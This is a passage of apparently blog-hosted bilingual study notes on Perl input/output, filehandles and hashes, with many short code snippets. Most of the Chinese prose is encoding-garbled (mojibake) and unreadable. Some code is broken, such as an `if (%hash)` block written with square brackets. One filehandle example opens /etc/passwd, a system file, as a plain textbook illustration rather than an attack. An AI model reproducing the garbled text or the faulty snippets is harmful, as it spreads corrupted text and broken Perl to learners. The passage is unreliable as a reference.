Output</h1><p>éœ€è¦çŸ¥é“é‚£äº›æƒ…å†µä¼šè¿”å›<code>undef</code>.</p><p>åˆ¤æ–­æ˜¯å¦åˆ°æ–‡ä»¶æœ«å°¾</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">defined</span>(<span class="hljs-variable">$line</span> = &lt;<span class="hljs-variable constant_">STDIN</span>&gt;))<br></code></pre></td></tr></table></figure><p>or </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">while</span> <span class="hljs-comment">(&lt;STDIN&gt;)</span><br></code></pre></td></tr></table></figure><p>There is no connection between the line-input operator and Perlâ€™s favorite default variable.</p><h2 id="Input-from-the-Diamond-Operator"><a href="#Input-from-the-Diamond-Operator" class="headerlink" title="Input from the Diamond Operator"></a>Input from the Diamond Operator</h2><p>The diamond operator: &lt;&gt;, itâ€™s actually a special kind of line-input operator.</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">./mytac <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>and the mytac file:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">print</span> <span class="hljs-keyword">reverse</span> &lt;&gt;;<br></code></pre></td></tr></table></figure><p>å‰é¢çš„ <code>&lt;STDIN&gt;</code> æ˜¯ä»æ ‡å‡†è¾“å…¥è·å–, æ¯•ç«Ÿ <code>&lt;&gt;</code> é‡Œé¢æ˜¯ <code>STDIN</code>, å•çº¯çš„ <code>&lt;&gt;</code> å°±æ˜¯ä»ç”¨æˆ·æŒ‡å®šçš„ä½ç½®è¯»å–.<br>file:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">one</span><br><span class="hljs-literal">two</span><br><span class="hljs-literal">three</span><br></code></pre></td></tr></table></figure><p>will print:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">three</span><br><span class="hljs-literal">two</span><br><span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><p>The invocation arguments å¤§æŠµæ˜¯å‘½ä»¤è¡Œå‚æ•°ã€‚</p><p><code>-</code> è¿å­—ç¬¦é€šå¸¸ä»£è¡¨æ ‡å‡†è¾“å…¥æµã€‚</p><p>é’»çŸ³æ“ä½œç¬¦ä»æŒ‡å®šä½ç½®è¯»å–ï¼Œå¦‚å‘½ä»¤è¡Œå‚æ•°ã€‚</p><p>ä¸åŠ å‚æ•°æ—¶ï¼Œchompä¼šç›´æ¥ä½œç”¨åœ¨<code>$_</code>ä¸Š.</p><p>The invocation arguments å­˜å‚¨åœ¨<code>@ARGV</code>ä¸­.</p><p>å¯é‡æ–°åˆå§‹åŒ–<code>@ARGV</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@ARGV = <span class="hljs-keyword">qw</span><span class="hljs-comment"># larry moe curly #;</span><br></code></pre></td></tr></table></figure><p>PerlæŠŠæ•°ç»„å†…æ’åˆ°å­—ç¬¦ä¸²ä¸­æ—¶ï¼Œä¼šåœ¨æ¯ä¸ªå…ƒç´ ä¹‹é—´åŠ ä¸Šç©ºæ ¼ã€‚</p><p><mark>ä¸ºä½•è¾“å‡ºç»“æœå…ˆå‘é€è‡³ç¼“å†²åŒº</mark><br>è®¿é—®ç£ç›˜ç¼“æ…¢ä¸”æ•ˆç‡ä½.</p><p><code>print &lt;&gt;;</code> ç›¸å½“äºUnixä¸‹çš„catå‘½ä»¤.</p><p><code>print sort &lt;&gt;;</code> ç›¸å½“äºUnixä¸‹çš„sortå‘½ä»¤.</p><p>ä¸€æ¡è§„åˆ™ï¼šå‡å¦‚å®ƒçœ‹èµ·æ¥åƒå‡½æ•°è°ƒç”¨ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨.</p><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p>åŒºåˆ†ï¼š<code>print @array;</code> å’Œ <code>print &quot;@array&quot;;</code></p><p>The front one print a list of items, the next one print a string. åè€…æœ‰åˆ†éš”ç¬¦. éƒ½è¾“å‡ºäº†æ•°ç»„ä¸­çš„å…¨éƒ¨å…ƒç´ , åªä¸è¿‡åè€…ä»¥ç©ºæ ¼åˆ†éš”, å‰è€…è¿åœ¨ä¸€èµ·.</p><h3 id="ç”¨printfæ ¼å¼åŒ–è¾“å‡º"><a href="#ç”¨printfæ ¼å¼åŒ–è¾“å‡º" class="headerlink" title="ç”¨printfæ ¼å¼åŒ–è¾“å‡º"></a>ç”¨printfæ ¼å¼åŒ–è¾“å‡º</h3><p>è¦è¾“å‡ºæ°å½“çš„æ•°å­—å½¢å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>%g</code>, å¯ä»¥æŠŠ<code>g</code>çœ‹ä½œâ€Good conversion for this numberâ€</p><p><code>printf</code>æœ€å¸¸ç”¨åœ¨å­—æ®µå¼çš„æ•°æ®è¾“å‡ºä¸Šï¼ŒæŒ‡å®šå­—æ®µå®½åº¦ï¼Œé»˜è®¤ä¸ºå³å¯¹é½ã€‚</p><p>A <code>*</code> inside the format string takes the next argument as a width:</p><h3 id="Arrays-and-printf"><a href="#Arrays-and-printf" class="headerlink" title="Arrays and printf"></a>Arrays and printf</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;The items are:\n&quot;</span>.(<span class="hljs-string">&quot;%10s\n&quot;</span> <span class="hljs-keyword">x</span> @items), @items;<br><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;%*s&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&quot;wilma&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="Filehandles"><a href="#Filehandles" class="headerlink" title="Filehandles"></a>Filehandles</h3><p>A name of a connection(å’Œæ–‡ä»¶ååŒºåˆ†). The connection is between your Perl process and the outside world.</p><p>æ„Ÿè§‰å¯ä»¥æŠŠè¿™ä¸ªçœ‹ä½œ<code>link</code>. å’Œæ–‡ä»¶æ“ä½œç¬¦ä¹ŸæŒºåƒçš„.</p><p>Recommend to use all uppercase letters in the name of your filehandle.</p><p>Six special filehandle nemes:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">STDIN</span><br><span class="hljs-attribute">STDOUT</span><br><span class="hljs-attribute">STDERR</span><br><span class="hljs-attribute">DATA</span><br><span class="hljs-attribute">ARGV</span><br><span class="hljs-attribute">ARGVOUT</span><br></code></pre></td></tr></table></figure><h3 id="æ‰“å¼€filehandle"><a href="#æ‰“å¼€filehandle" class="headerlink" title="æ‰“å¼€filehandle"></a>æ‰“å¼€filehandle</h3><p>å»ºè®®å…¨ç”¨å¤§å†™å­—æ¯æ¥å‘½åæ–‡ä»¶å¥æŸ„.</p><p>éƒ½æ˜¯è¡Œå¤„ç†æ¨¡å¼.</p><p>ä½¿ç”¨<code>open</code> operator.</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">open</span> CONFIG, <span class="hljs-string">&#x27;&lt;dino&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åé¢çš„æ˜¯æ–‡ä»¶å, <code>&lt;</code>, <code>&lt;&lt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code> è¡¨ç¤ºè¾“å…¥è¾“å‡º.<br>or</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $selected_output = <span class="hljs-string">&#x27;my_output&#x27;</span>;<br><span class="hljs-keyword">open</span> LOG, <span class="hljs-string">&quot;&gt; $selected_output&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¸‰å‚æ•°å†™æ³• (æœ€å¥½å†™æˆè¿™ç§)ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> BEDROCK, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $file_name;<br></code></pre></td></tr></table></figure><p>ä»¥ç‰¹å®šç¼–ç å†™æ•°æ®åˆ°æŸä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">open <span class="hljs-built_in">LOG</span>, <span class="hljs-string">&#x27;&gt;&gt;:encoding(UTF-8)&#x27;</span>, <span class="hljs-symbol">$file</span>_name;<br></code></pre></td></tr></table></figure><p>layer, å±‚çš„æ¦‚å¿µå’Œç¼–ç è½¬æ¢ç•¥æœ‰ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸åŒçš„å±‚å åŠ èµ·æ¥(å°±æ˜¯å› ä¸ºèƒ½å åŠ æ‰å«åšå±‚)ï¼Œäº§ç”Ÿä¸åŒçš„æ•ˆæœ.</p><p>åˆ¤æ–­æ‰§è¡Œï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">my $success = open <span class="hljs-keyword">LOG</span>, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;logfile&#x27;</span>;<br><span class="hljs-keyword">if</span> (! $success) &#123;<br>    <span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>open</code>çš„è¿”å›å€¼ï¼Œå¦‚æœä¸ºçœŸåˆ™ä¸ºæˆåŠŸï¼Œä¸ºå‡åˆ™ä¸ºå¤±è´¥ã€‚</p><h3 id="å…³é—­filehandle"><a href="#å…³é—­filehandle" class="headerlink" title="å…³é—­filehandle"></a>å…³é—­filehandle</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">close BEDROCK<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><mark>Small Conclusion</mark><br>filehandle, ç”¨äºåœ¨Perlç¨‹åºä¸­æ“ä½œå¤–éƒ¨æ–‡ä»¶ã€‚</p><h3 id="ç”¨dieå¤„ç†è‡´å‘½é”™è¯¯"><a href="#ç”¨dieå¤„ç†è‡´å‘½é”™è¯¯" class="headerlink" title="ç”¨dieå¤„ç†è‡´å‘½é”™è¯¯"></a>ç”¨dieå¤„ç†è‡´å‘½é”™è¯¯</h3><p><code>die</code> å‘½ä»¤èƒ½ä¸­æ­¢ç¨‹åºå¹¶å‘å‡ºé”™è¯¯ä¿¡æ¯å‘ŠçŸ¥åŸå› ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">open</span> LOG, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;logfile&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create logfile: $!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$!</code> ä¸ºç‰¹æ®Šå˜é‡ï¼Œå­˜æ”¾è§£é‡Šæ€§çš„ç³»ç»Ÿé”™è¯¯ä¿¡æ¯ã€‚åªæœ‰åœ¨ç³»ç»ŸæœåŠ¡è¯·æ±‚å¤±è´¥åæ‰æœ‰ç”¨ã€‚</p><p>ç¨‹åºåä¿å­˜åœ¨ç‰¹æ®Šå˜é‡<code>$0</code>ä¸­ã€‚</p><p>è‹¥åœ¨<code>die</code>åé¢åŠ ä¸Šæ¢è¡Œç¬¦ï¼Œå°±ä¸ä¼šæ˜¾ç¤ºè¡Œå·å’Œæ–‡ä»¶åã€‚</p><h3 id="ç”¨warné€å‡ºè­¦å‘Šä¿¡æ¯"><a href="#ç”¨warné€å‡ºè­¦å‘Šä¿¡æ¯" class="headerlink" title="ç”¨warné€å‡ºè­¦å‘Šä¿¡æ¯"></a>ç”¨warné€å‡ºè­¦å‘Šä¿¡æ¯</h3><p>äº§ç”Ÿè­¦å‘Šä¿¡æ¯ï¼Œä¸ä¼šä¸­æ­¢ç¨‹åº. </p><h3 id="è‡ªåŠ¨æ£€æµ‹è‡´å‘½é”™è¯¯"><a href="#è‡ªåŠ¨æ£€æµ‹è‡´å‘½é”™è¯¯" class="headerlink" title="è‡ªåŠ¨æ£€æµ‹è‡´å‘½é”™è¯¯"></a>è‡ªåŠ¨æ£€æµ‹è‡´å‘½é”™è¯¯</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">use autodie<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨filehandle"><a href="#ä½¿ç”¨filehandle" class="headerlink" title="ä½¿ç”¨filehandle"></a>ä½¿ç”¨filehandle</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @line = &lt;STDIN&gt;;<br><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">open</span> PASSWD, <span class="hljs-string">&quot;/etc/passwd&quot;</span>) &#123;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;How did you get logged in? ($!)&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">while</span> (&lt;PASSWD&gt;) &#123;<br>    <span class="hljs-keyword">chomp</span>;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Using in <code>print</code>:</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-built_in">print</span> <span class="hljs-built_in">LOG</span> <span class="hljs-string">&quot;Captain&#x27;s log, stardate 3.14159\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="æ”¹å˜é»˜è®¤çš„æ–‡ä»¶è¾“å‡ºå¥æŸ„"><a href="#æ”¹å˜é»˜è®¤çš„æ–‡ä»¶è¾“å‡ºå¥æŸ„" class="headerlink" title="æ”¹å˜é»˜è®¤çš„æ–‡ä»¶è¾“å‡ºå¥æŸ„"></a>æ”¹å˜é»˜è®¤çš„æ–‡ä»¶è¾“å‡ºå¥æŸ„</h3><p><code>print</code> ä¼šé»˜è®¤è¾“å‡ºåˆ° <code>STDOUT</code> ä¸­.</p><p>ä½¿ç”¨<code>select</code>:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">select BEDROCK<span class="hljs-comment">;</span><br>print <span class="hljs-string">&quot;I hope&quot;</span><span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, è¿™é‡Œçš„ <code>print</code> å°±ä¼šè¾“å‡ºåˆ° <code>BEDROCK</code> ä¸­.<br>ç‰¹æ®Šå˜é‡<code>$|</code>è®¾ç½®ä¸º1,ä½¿é»˜è®¤å¥æŸ„åœ¨æ¯æ¬¡è¿›è¡Œè¾“å‡ºæ“ä½œåç«‹åˆ»åˆ·æ–°ç¼“å†²åŒºã€‚</p><h3 id="ç”¨sayå‡½æ•°è¾“å‡º"><a href="#ç”¨sayå‡½æ•°è¾“å‡º" class="headerlink" title="ç”¨sayå‡½æ•°è¾“å‡º"></a>ç”¨sayå‡½æ•°è¾“å‡º</h3><p>ä¼šè‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ã€‚</p><h3 id="æ ‡é‡å˜é‡ä¸­çš„filehandle"><a href="#æ ‡é‡å˜é‡ä¸­çš„filehandle" class="headerlink" title="æ ‡é‡å˜é‡ä¸­çš„filehandle"></a>æ ‡é‡å˜é‡ä¸­çš„filehandle</h3><p>è£¸å­—bareword, å³åƒ<code>STDIN</code>è¿™ç§ç›´æ¥ä½¿ç”¨ï¼Œè€Œä¸æ˜¯å­˜å‚¨åœ¨å˜é‡ä¸­.</p><p>ä½¿ç”¨å‰éœ€ç¡®ä¿å˜é‡ä¸ºç©ºï¼Œä»¥ç”¨æ¥å­˜æ”¾filehandle. æœ‰äººå–œæ¬¢åœ¨å˜é‡ååé¢æ·»åŠ <code>_fh</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @line = &lt;STDIN&gt;;<br><span class="hljs-keyword">my</span> $rocks_fh;<br><span class="hljs-keyword">open</span> $rocks_fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;rocks.txt&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨èŠ±æ‹¬å·ï¼ŒPerlä¼šçŸ¥é“è¿™ä¸ªå˜é‡æ˜¯filehandle: <code>print &#123; $rock_fh &#125;;</code></p><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h3><p><code>&lt;STDIN&gt;</code> åªæ¥å—ä¸€è¡Œçš„è¾“å…¥ã€‚</p><p>ä»æ ‡å‡†è¾“å…¥ä¸­è·å–å¤šè¡Œ:</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">my <span class="hljs-meta">@line</span> = <span class="hljs-variable">&lt;STDIN&gt;</span>;<br></code></pre></td></tr></table></figure><p><code>print</code> çš„ä¸€ç§ç”¨æ³•:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;the first string &quot;</span>, <span class="hljs-string">&quot;, the second string &quot;</span>;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-6-Hash"><a href="#CHAPTER-6-Hash" class="headerlink" title="CHAPTER 6 Hash"></a>CHAPTER 6 Hash</h1><p>å“ˆå¸Œæ˜¯ä¸€ç§æ•°æ®ç»“æ„ã€‚<br>å’Œæ•°ç»„çš„åŒºåˆ«ï¼š</p><pre><code class="hljs">1. å¯ä»¥å®¹çº³ä»»æ„å¤šçš„å€¼2. ç”¨åå­—æ£€ç´¢ï¼Œé”®å’Œå€¼ï¼Œé”®å”¯ä¸€ã€‚3. æ²¡æœ‰é¡ºåºã€‚</code></pre><p>é”®æ€»ä¼šè¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>å“ˆå¸Œæ˜¯ä»<code>awk</code>è¯­è¨€ä¸­å¼•å…¥çš„.</p><p>å“ˆå¸Œæ˜¯ä»é”®åˆ°å€¼çš„å•è¡Œé“ï¼Œæ— æ³•ä»å€¼åæ¨å‡ºå…¶é”®.</p><h2 id="è®¿é—®å“ˆå¸Œå…ƒç´ "><a href="#è®¿é—®å“ˆå¸Œå…ƒç´ " class="headerlink" title="è®¿é—®å“ˆå¸Œå…ƒç´ "></a>è®¿é—®å“ˆå¸Œå…ƒç´ </h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">hash</span>&#123;<span class="hljs-variable">$some_key</span>&#125;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œä½¿ç”¨çš„æ˜¯èŠ±æ‹¬å·.</p><h3 id="èµ‹å€¼"><a href="#èµ‹å€¼" class="headerlink" title="èµ‹å€¼"></a>èµ‹å€¼</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;fred&#x27;</span>&#125; = <span class="hljs-string">&#x27;flintstone&#x27;</span>;<br><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;barney&#x27;</span>&#125; = <span class="hljs-string">&#x27;rubble&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><p>å“ˆå¸Œæœ‰è‡ªå·±çš„åç§°ç©ºé—´.</p><p>ç¾å…ƒç¬¦å·å’ŒèŠ±æ‹¬å·ï¼Œæ˜¾ç¤ºä¸€ä¸ªå“ˆå¸Œå…ƒç´ ã€‚</p><p>èµ‹å€¼æ—¶ä¼š<mark>åˆ›å»ºå“ˆå¸Œå…ƒç´ </mark>ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$family</span>_name&#123;<span class="hljs-string">&#x27;wilma&#x27;</span>&#125; = <span class="hljs-string">&#x27;flintstone&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªæ–°çš„é”®å€¼å¯¹.</p><h2 id="è®¿é—®æ•´ä¸ªå“ˆå¸Œ"><a href="#è®¿é—®æ•´ä¸ªå“ˆå¸Œ" class="headerlink" title="è®¿é—®æ•´ä¸ªå“ˆå¸Œ"></a>è®¿é—®æ•´ä¸ªå“ˆå¸Œ</h2><p>èµ‹å€¼, å¿…é¡»æ˜¯å¶æ•°ä¸ªï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">%some_hash = (<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-number">35</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-number">12.4</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥åªèƒ½ç”¨ <code>()</code> åŒ…è£¹.</p><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­ï¼Œå“ˆå¸Œçš„å€¼æ˜¯ç®€å•çš„é”®-å€¼å¯¹åˆ—è¡¨.</p><p>unwinding the hash â€“ turning it back into a list of key-value pairs.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@any_array</span> = %some_hash;<br></code></pre></td></tr></table></figure><p>é¡ºåºå¯èƒ½é”™ä¹±.</p><h3 id="Hash-Assignment"><a href="#Hash-Assignment" class="headerlink" title="Hash Assignment"></a>Hash Assignment</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %new_hash = %old_hash;<br></code></pre></td></tr></table></figure><p>Perl ä¼šå…ˆunwind the <code>%old_hash</code> into a list of key-vaule pairs, ç„¶åèµ‹ç»™<code>%new_hash</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %inverse_hash = <span class="hljs-keyword">reverse</span> %any_hash;<br></code></pre></td></tr></table></figure><p>é”®å€¼ä¼šåè½¬.</p><p>ä¸€ä¸ªPerlçš„rule: The last in wins.</p><h2 id="The-Big-Arrow"><a href="#The-Big-Arrow" class="headerlink" title="The Big Arrow"></a>The Big Arrow</h2><p>The Big Arrow (&#x3D;&gt;), itâ€™s just a different way to â€œspellâ€ a comma. åœ¨Perlä¸­ï¼Œå¯ä»¥ä½¿ç”¨èƒ–ç®­å¤´ä»£æ›¿é€—å·.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">my %last_name = ( <span class="hljs-comment"># a hash may be a lexical variable</span><br>    <span class="hljs-string">&#x27;fred&#x27;</span> =&gt; <span class="hljs-string">&#x27;flintstone&#x27;</span>,<br>    <span class="hljs-string">&#x27;dino&#x27;</span> =&gt; undef,<br>    <span class="hljs-string">&#x27;barney&#x27;</span> =&gt; <span class="hljs-string">&#x27;rubble&#x27;</span>,<br>)<br></code></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨<code>fat array</code>æ—¶ï¼Œå¯ä»¥çœç•¥é”®ä¸¤ä¾§çš„å¼•å·ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">my %last_name = ( <span class="hljs-comment"># a hash may be a lexical variable</span><br>    fred =&gt; <span class="hljs-string">&#x27;flintstone&#x27;</span>,<br>    dino =&gt; undef,<br>    barney =&gt; <span class="hljs-string">&#x27;rubble&#x27;</span>,<br>)<br></code></pre></td></tr></table></figure><p>Simple string without quote marks is called a bareword.</p><h2 id="Hash-Function"><a href="#Hash-Function" class="headerlink" title="Hash Function"></a>Hash Function</h2><p>åœ¨æ•°ç»„ä¸Šä¸‹æ–‡ä¸­ï¼š<br><code>keys</code> function, return a list of all the keys in a hash.</p><p><code>values</code> function, return a list of corresponding values.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %hash = (<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-number">3</span>,);<br><span class="hljs-keyword">my</span> @k = <span class="hljs-keyword">keys</span> %hash;<br><span class="hljs-keyword">my</span> @v = <span class="hljs-keyword">values</span> %hash;<br><br></code></pre></td></tr></table></figure><p>åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­ï¼š<br>è¿”å›æ•°é‡ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $count = <span class="hljs-keyword">keys</span> %hash; <br></code></pre></td></tr></table></figure><p>å°†å“ˆå¸Œä½œä¸ºBooleanï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (%<span class="hljs-built_in">hash</span>) [<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;That was a true value!\n&quot;</span>;<br>]<br></code></pre></td></tr></table></figure><p>å½“è‡³å°‘æœ‰ä¸€å¯¹æ—¶ä¸ºçœŸ.</p><h3 id="The-each-Function"><a href="#The-each-Function" class="headerlink" title="The each Function"></a>The each Function</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ( ($key, $value) = <span class="hljs-keyword">each</span> %hash ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$key =&gt; $value\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-exists-Function"><a href="#The-exists-Function" class="headerlink" title="The exists Function"></a>The exists Function</h3><p>To see whether a key exists in the hash.</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">exists</span> $books&#123;<span class="hljs-string">&quot;dino&quot;</span>&#125;) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hey, there&#x27;s a library card for dino!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="The-delete-Function"><a href="#The-delete-Function" class="headerlink" title="The delete  Function"></a>The delete  Function</h3><p>The delete function removes the given key (and its corresponding value).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $person = <span class="hljs-string">&quot;betty&quot;</span>;<br><span class="hljs-keyword">delete</span> $books&#123;$person&#125;;<br></code></pre></td></tr></table></figure><h3 id="Hash-Element-Interpolation"><a href="#Hash-Element-Interpolation" class="headerlink" title="Hash Element Interpolation"></a>Hash Element Interpolation</h3><p>The 